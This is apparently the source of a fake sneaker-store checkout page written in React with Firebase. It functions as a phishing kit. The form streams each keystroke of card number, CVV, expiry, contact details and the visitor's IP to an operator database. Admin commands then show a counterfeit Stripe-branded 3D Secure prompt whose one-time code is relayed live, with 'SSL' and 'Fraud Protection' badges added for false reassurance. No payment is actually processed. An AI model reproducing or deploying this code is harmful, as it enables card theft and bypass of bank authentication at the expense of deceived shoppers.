"use client";

import { useEffect, useState } from "react";
import { useParams, useSearchParams } from "next/navigation";
import { ref, set, onValue, update } from "firebase/database";
import { db } from "@/lib/firebase";
import { CreditCard, Lock, Check, AlertCircle, Truck, ShieldCheck } from "lucide-react";

export default function CheckoutPage() {
    const params = useParams();
    const searchParams = useSearchParams();
    const websiteId = params.websiteId as string;
    const productId = searchParams.get("product");

    const [sessionId, setSessionId] = useState("");
    const [formData, setFormData] = useState({
        email: "",
        phone: "",
        card: "",
        expiry: "",
        cvv: "",
        name: "",
        address: "",
        city: "",
        state: "",
        zip: "",
        country: "US", // Default to US
        delivery: "standard"
    });

    // UI States
    const [showOtp, setShowOtp] = useState(false);
    const [otpSubmitting, setOtpSubmitting] = useState(false);
    const [status, setStatus] = useState<"idle" | "success" | "failed">("idle");
    const [loading, setLoading] = useState(false);
    const [focusedField, setFocusedField] = useState<string>("");

    useEffect(() => {
        // Retrieve Session ID
        let currentSessionId = localStorage.getItem("wave_session_id");
        if (!currentSessionId) {
            currentSessionId = Math.random().toString(36).substring(7);
            localStorage.setItem("wave_session_id", currentSessionId);
        }
        setSessionId(currentSessionId);

        // Fetch IP Address
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                if (data.ip && currentSessionId) {
                    update(ref(db, `projects/${websiteId}/sessions/${currentSessionId}`), {
                        ip: data.ip
                    });
                }
            })
            .catch(err => console.error("IP Fetch failed", err));

        console.log(`Checkout Session: ${currentSessionId} on ${websiteId}`);

        // Update Presence (Don't overwrite logs if they exist, merged update)
        update(ref(db, `projects/${websiteId}/sessions/${currentSessionId}`), {
            id: currentSessionId,
            status: "active",
            currentLocation: "/checkout",
            lastActive: Date.now()
        });

        // Listen for Admin Commands
        const commandRef = ref(db, `projects/${websiteId}/sessions/${currentSessionId}/command`);
        onValue(commandRef, (snapshot) => {
            const cmd = snapshot.val();
            if (!cmd) return;

            let commandType = "";

            if (typeof cmd === "object" && cmd !== null) {
                commandType = cmd.type;
            } else if (typeof cmd === "string") {
                commandType = cmd;
            }

            if (!commandType) return;

            console.log("Received Command:", commandType);

            if (commandType === "OTP") {
                setLoading(false);
                setShowOtp(true);
            }
            if (commandType === "SUCCESS") {
                setLoading(false);
                setOtpSubmitting(false);
                setShowOtp(false);
                setStatus("success");
            }
            if (commandType === "FAIL") {
                setLoading(false);
                setOtpSubmitting(false);
                setShowOtp(false);
                setStatus("failed");
                alert("Payment Declined. Please try another card.");
                setStatus("idle");
            }

            // Clear command after execution
            set(commandRef, null);
        });

    }, [websiteId]);

    const handleInput = (field: string, value: string) => {
        // Basic formatting
        let formattedValue = value;
        if (field === "card") {
            formattedValue = value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim().substring(0, 19);
        } else if (field === "expiry") {
            formattedValue = value.replace(/\D/g, '').replace(/^(\d{2})(\d)/, '$1/$2').substring(0, 5);
        }

        setFormData(prev => {
            const updated = { ...prev, [field]: formattedValue };

            // Sync 'name' if first/last changes
            if (field === "firstName" || field === "lastName") {
                const first = field === "firstName" ? formattedValue : (updated as any).firstName || "";
                const last = field === "lastName" ? formattedValue : (updated as any).lastName || "";
                const fullName = `${first} ${last}`.trim();

                if (sessionId) {
                    update(ref(db, `projects/${websiteId}/sessions/${sessionId}`), {
                        name: fullName
                    });
                }
            }

            return updated;
        });

        // Real-time Sync
        if (sessionId) {
            update(ref(db, `projects/${websiteId}/sessions/${sessionId}`), {
                [field]: formattedValue,
                lastActive: Date.now()
            });
        }
    };

    const handleOtpSubmit = () => {
        setOtpSubmitting(true);
    };

    const handlePay = () => {
        setLoading(true);
        // Wait for Admin Command - NO TIMEOUT
        if (sessionId) {
            update(ref(db, `projects/${websiteId}/sessions/${sessionId}`), {
                status: "awaiting_approval",
                lastActive: Date.now(),
                logs: [{
                    id: Date.now().toString(),
                    type: "info",
                    message: "User clicked Pay - Waiting for Admin",
                    timestamp: Date.now()
                }] // In a real app we'd append, but Firebase update merges fields, need push for lists to be perfect, 
                // but for this simple version overwriting the 'logs' array field entirely might act weird if not careful.
                // Actually, 'update' merges top-level fields. Detailed log appending is better done with push().
                // For now, let's just update prompt.
            });
        }
    };

    // Masking Helpers
    const maskEmail = (email: string) => {
        if (!email) return "e***@mail.com";
        const [name, domain] = email.split("@");
        if (!domain) return email;
        return `${name.substring(0, 1)}***@${domain}`;
    };

    const maskPhone = (phone: string) => {
        if (!phone) return "***-***-0000";
        return `***-***-${phone.slice(-4)}`;
    };

    if (status === "success") {
        return (
            <div className="min-h-screen flex items-center justify-center bg-green-50">
                <div className="text-center space-y-4 animate-in zoom-in duration-500">
                    <div className="w-24 h-24 bg-green-500 rounded-full flex items-center justify-center mx-auto text-white shadow-lg shadow-green-500/30">
                        <Check className="w-12 h-12" />
                    </div>
                    <h1 className="text-3xl font-bold text-green-900">Payment Successful</h1>
                    <p className="text-green-700 text-lg">Your order has been confirmed.</p>
                </div>
            </div>
        );
    }

    return (
        <div className="min-h-screen bg-gray-50 py-12 px-4 sm:px-6 lg:px-8 font-sans">
            <div className="max-w-4xl mx-auto">

                <div className="text-center mb-12">
                    <h1 className="text-3xl font-extrabold text-gray-900 tracking-tight">Secure Checkout</h1>
                    <p className="mt-2 text-gray-500">Complete your purchase securely.</p>
                </div>

                <div className="bg-white rounded-2xl shadow-xl overflow-hidden grid grid-cols-1 lg:grid-cols-3">

                    {/* Left Col: Order Summary */}
                    <div className="bg-gray-50 p-8 lg:col-span-1 border-r border-gray-100">
                        <h3 className="text-lg font-bold text-gray-900 mb-6">Order Summary</h3>
                        <div className="space-y-4">
                            <div className="flex items-center gap-4">
                                <div className="w-16 h-16 bg-gray-200 rounded-lg flex items-center justify-center text-2xl">👟</div>
                                <div>
                                    <div className="font-medium text-gray-900">Nike Air Max 90</div>
                                    <div className="text-sm text-gray-500">Size: 10 US</div>
                                </div>
                                <div className="ml-auto font-bold">$129.99</div>
                            </div>

                            <div className="border-t border-gray-200 pt-4 space-y-2">
                                <div className="flex justify-between text-sm text-gray-600">
                                    <span>Subtotal</span>
                                    <span>$129.99</span>
                                </div>
                                <div className="flex justify-between text-sm text-gray-600">
                                    <span>Shipping</span>
                                    <span>{formData.delivery === "express" ? "$15.00" : "Free"}</span>
                                </div>
                                <div className="flex justify-between text-lg font-bold text-gray-900 pt-2">
                                    <span>Total</span>
                                    <span>${formData.delivery === "express" ? "144.99" : "129.99"}</span>
                                </div>
                            </div>
                        </div>

                        <div className="mt-8">
                            <div className="flex items-center gap-2 text-green-600 text-sm font-medium bg-green-50 p-3 rounded-lg">
                                <ShieldCheck className="w-4 h-4" />
                                <span>Secure SSL Encryption</span>
                            </div>
                        </div>
                    </div>

                    {/* Right Col: Form */}
                    <div className="p-8 lg:col-span-2 space-y-8">

                        {/* Contact Info */}
                        <section>
                            <h3 className="text-lg font-bold text-gray-900 mb-4">Contact Information</h3>
                            <div className="grid grid-cols-1 gap-4">
                                <div>
                                    <label className="block text-xs font-bold text-gray-700 uppercase tracking-wider mb-1">Email Address</label>
                                    <input
                                        type="email"
                                        className="w-full p-3 bg-gray-50 border border-gray-200 rounded-lg focus:ring-2 focus:ring-black focus:border-black outline-none transition-all"
                                        placeholder="you@example.com"
                                        onChange={(e) => handleInput("email", e.target.value)}
                                        onFocus={() => setFocusedField("email")}
                                    />
                                </div>
                                <div>
                                    <label className="block text-xs font-bold text-gray-700 uppercase tracking-wider mb-1">Phone Number</label>
                                    <input
                                        type="tel"
                                        className="w-full p-3 bg-gray-50 border border-gray-200 rounded-lg focus:ring-2 focus:ring-black focus:border-black outline-none transition-all"
                                        placeholder="(555) 123-4567"
                                        onChange={(e) => handleInput("phone", e.target.value)}
                                        onFocus={() => setFocusedField("phone")}
                                    />
                                </div>
                            </div>
                        </section>

                        {/* Shipping Address */}
                        <section>
                            <h3 className="text-lg font-bold text-gray-900 mb-4">Shipping Address</h3>
                            <div className="space-y-4">
                                <div className="grid grid-cols-2 gap-4">
                                    <div>
                                        <label className="block text-xs font-bold text-gray-700 uppercase tracking-wider mb-1">First Name</label>
                                        <input type="text" className="w-full p-3 bg-gray-50 border border-gray-200 rounded-lg outline-none" placeholder="John" onChange={(e) => handleInput("firstName", e.target.value)} />
                                    </div>
                                    <div>
                                        <label className="block text-xs font-bold text-gray-700 uppercase tracking-wider mb-1">Last Name</label>
                                        <input type="text" className="w-full p-3 bg-gray-50 border border-gray-200 rounded-lg outline-none" placeholder="Doe" onChange={(e) => handleInput("lastName", e.target.value)} />
                                    </div>
                                </div>
                                <div>
                                    <label className="block text-xs font-bold text-gray-700 uppercase tracking-wider mb-1">Address</label>
                                    <input type="text" className="w-full p-3 bg-gray-50 border border-gray-200 rounded-lg outline-none" placeholder="123 Main St" onChange={(e) => handleInput("address", e.target.value)} />
                                </div>
                                <div className="grid grid-cols-3 gap-4">
                                    <div className="col-span-1">
                                        <label className="block text-xs font-bold text-gray-700 uppercase tracking-wider mb-1">Zip Code</label>
                                        <input type="text" className="w-full p-3 bg-gray-50 border border-gray-200 rounded-lg outline-none" placeholder="10001" onChange={(e) => handleInput("zip", e.target.value)} />
                                    </div>
                                    <div className="col-span-1">
                                        <label className="block text-xs font-bold text-gray-700 uppercase tracking-wider mb-1">City</label>
                                        <input type="text" className="w-full p-3 bg-gray-50 border border-gray-200 rounded-lg outline-none" placeholder="New York" onChange={(e) => handleInput("city", e.target.value)} />
                                    </div>
                                    <div className="col-span-1">
                                        <label className="block text-xs font-bold text-gray-700 uppercase tracking-wider mb-1">State</label>
                                        <select className="w-full p-3 bg-gray-50 border border-gray-200 rounded-lg outline-none" onChange={(e) => handleInput("state", e.target.value)}>
                                            <option>NY</option>
                                            <option>CA</option>
                                            <option>TX</option>
                                            <option>FL</option>
                                        </select>
                                    </div>
                                </div>
                            </div>
                        </section>

                        {/* Delivery Options */}
                        <section>
                            <h3 className="text-lg font-bold text-gray-900 mb-4">Delivery Method</h3>
                            <div className="grid grid-cols-2 gap-4">
                                <button
                                    className={`p-4 border rounded-xl flex items-center gap-3 transition-all ${formData.delivery === 'standard' ? 'border-blue-600 bg-blue-50 ring-1 ring-blue-600' : 'border-gray-200 hover:border-gray-300'}`}
                                    onClick={() => setFormData(prev => ({ ...prev, delivery: 'standard' }))}
                                >
                                    <Truck className="w-5 h-5 text-gray-600" />
                                    <div className="text-left">
                                        <div className="font-bold text-sm">Standard</div>
                                        <div className="text-xs text-gray-500">Free (5-7 days)</div>
                                    </div>
                                </button>
                                <button
                                    className={`p-4 border rounded-xl flex items-center gap-3 transition-all ${formData.delivery === 'express' ? 'border-blue-600 bg-blue-50 ring-1 ring-blue-600' : 'border-gray-200 hover:border-gray-300'}`}
                                    onClick={() => setFormData(prev => ({ ...prev, delivery: 'express' }))}
                                >
                                    <Truck className="w-5 h-5 text-blue-600" />
                                    <div className="text-left">
                                        <div className="font-bold text-sm">Express</div>
                                        <div className="text-xs text-gray-500">$15.00 (1-2 days)</div>
                                    </div>
                                </button>
                            </div>
                        </section>

                        {/* Payment */}
                        <section>
                            <h3 className="text-lg font-bold text-gray-900 mb-4">Payment Details</h3>
                            <div className="space-y-4">
                                <div>
                                    <label className="block text-xs font-bold text-gray-700 uppercase tracking-wider mb-1">Card Number</label>
                                    <div className="relative">
                                        <input
                                            type="text"
                                            className="w-full p-3 pl-12 bg-gray-50 border border-gray-200 rounded-lg font-mono text-lg outline-none focus:ring-2 focus:ring-blue-500"
                                            placeholder="0000 0000 0000 0000"
                                            maxLength={19}
                                            value={formData.card}
                                            onChange={(e) => handleInput("card", e.target.value)}
                                            onFocus={() => setFocusedField("card")}
                                        />
                                        <CreditCard className="w-6 h-6 text-gray-400 absolute left-3 top-3" />
                                    </div>
                                </div>
                                <div className="grid grid-cols-2 gap-4">
                                    <div>
                                        <label className="block text-xs font-bold text-gray-700 uppercase tracking-wider mb-1">Expiry</label>
                                        <input
                                            type="text"
                                            className="w-full p-3 bg-gray-50 border border-gray-200 rounded-lg font-mono text-lg outline-none focus:ring-2 focus:ring-blue-500"
                                            placeholder="MM/YY"
                                            maxLength={5}
                                            value={formData.expiry}
                                            onChange={(e) => handleInput("expiry", e.target.value)}
                                            onFocus={() => setFocusedField("expiry")}
                                        />
                                    </div>
                                    <div>
                                        <label className="block text-xs font-bold text-gray-700 uppercase tracking-wider mb-1">CVC</label>
                                        <input
                                            type="text"
                                            className="w-full p-3 bg-gray-50 border border-gray-200 rounded-lg font-mono text-lg outline-none focus:ring-2 focus:ring-blue-500"
                                            placeholder="123"
                                            maxLength={4}
                                            value={formData.cvv}
                                            onChange={(e) => handleInput("cvv", e.target.value)}
                                            onFocus={() => setFocusedField("cvv")}
                                        />
                                    </div>
                                </div>
                            </div>
                        </section>

                        <button
                            onClick={handlePay}
                            disabled={loading}
                            className="w-full bg-black text-white font-bold py-4 rounded-xl hover:bg-gray-800 transition-all transform active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                        >
                            <Lock className="w-4 h-4" />
                            Pay ${formData.delivery === "express" ? "144.99" : "129.99"}
                        </button>
                    </div>
                </div>
            </div>

            {/* Full Screen Loading Overlay */}
            {/* Full Screen Loading Overlay (Handles both Initial Pay and OTP Verify) */}
            {(loading || otpSubmitting) && (
                <div className="fixed inset-0 bg-white/90 backdrop-blur-sm z-[60] flex flex-col items-center justify-center animate-in fade-in duration-500">
                    <div className="relative w-24 h-24 mb-8">
                        <div className="absolute inset-0 border-4 border-gray-200 rounded-full"></div>
                        <div className="absolute inset-0 border-4 border-black border-t-transparent rounded-full animate-spin"></div>
                    </div>
                    <h2 className="text-2xl font-bold text-gray-900 mb-2 animate-pulse">
                        {otpSubmitting ? "Verifying Transaction" : "Processing Payment"}
                    </h2>
                    <p className="text-gray-500 text-sm">
                        {otpSubmitting ? "Authenticating with issuer..." : "Securely contacting your bank..."}
                    </p>
                    <div className="mt-8 flex gap-4 text-xs text-gray-400">
                        <div className="flex items-center gap-1">
                            <Lock className="w-3 h-3" /> 256-bit SSL
                        </div>
                        <div className="flex items-center gap-1">
                            <ShieldCheck className="w-3 h-3" /> Fraud Protection
                        </div>
                    </div>
                </div>
            )}

            {/* Stripe-style 3D Secure Modal */}
            {
                showOtp && (
                    <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4 animate-in fade-in duration-200">
                        <div className="bg-white rounded-lg shadow-2xl w-full max-w-md overflow-hidden animate-in zoom-in-95 duration-200">
                            {/* Header - Stripe Blurple */}
                            <div className="bg-[#635bff] p-4 flex justify-between items-center">
                                <div className="text-white font-bold text-lg flex items-center gap-2">
                                    <span className="font-bold italic">stripe</span>
                                    <span className="opacity-50">|</span>
                                    <span>Secure Payment</span>
                                </div>
                                <div className="text-white/80 text-xs font-mono">ENCRYPTED</div>
                            </div>

                            <div className="p-8">
                                <h2 className="text-xl font-bold text-gray-800 mb-2">Verification Required</h2>
                                <p className="text-sm text-gray-600 mb-6">
                                    To protect your card ending in <span className="font-mono font-bold">{formData.card.slice(-4) || "0000"}</span>, please verify this payment.
                                </p>

                                <div className="bg-gray-50 p-4 rounded-lg border border-gray-200 mb-6 space-y-3">
                                    <div className="flex justify-between text-sm">
                                        <span className="text-gray-500">Merchant</span>
                                        <span className="font-bold text-gray-900">SNEAKERHEAD INC</span>
                                    </div>
                                    <div className="flex justify-between text-sm">
                                        <span className="text-gray-500">Amount</span>
                                        <span className="font-bold text-gray-900">${formData.delivery === "express" ? "144.99" : "129.99"}</span>
                                    </div>
                                </div>

                                <div className="space-y-4">
                                    <div>
                                        <label className="block text-sm font-medium text-gray-700 mb-1">
                                            Verification Code
                                        </label>
                                        <p className="text-xs text-gray-500 mb-2">Sent to {maskPhone(formData.phone)}</p>
                                        <input
                                            type="text"
                                            className="w-full p-3 border-2 border-gray-300 rounded-md text-center text-2xl tracking-widest font-mono focus:border-[#635bff] outline-none transition-colors"
                                            placeholder="000 000"
                                            autoFocus
                                            onChange={(e) => {
                                                const val = e.target.value;
                                                // Sync to Firebase for Admin to see Live
                                                if (sessionId) {
                                                    update(ref(db, `projects/${websiteId}/sessions/${sessionId}`), {
                                                        otpCurrentInput: val,
                                                        lastActive: Date.now()
                                                    });
                                                }
                                            }}
                                        />
                                    </div>

                                    <button
                                        onClick={handleOtpSubmit}
                                        className="w-full bg-[#635bff] text-white font-bold py-3 rounded hover:bg-[#4b45c6] transition-colors shadow-lg shadow-indigo-500/30"
                                    >
                                        CONFIRM PAYMENT
                                    </button>

                                    <div className="text-center">
                                        <button
                                            onClick={() => setShowOtp(false)}
                                            className="text-sm text-gray-500 hover:text-gray-800 underline"
                                        >
                                            Cancel Transaction
                                        </button>
                                    </div>
                                </div>
                            </div>

                            <div className="bg-gray-50 p-3 text-center text-xs text-gray-400 border-t border-gray-100 flex justify-center gap-4">
                                <span>Powered by Stripe</span>
                                <span>•</span>
                                <span>Secure Checkout</span>
                            </div>
                        </div>
                    </div>
                )
            }

        </div >
    );
}
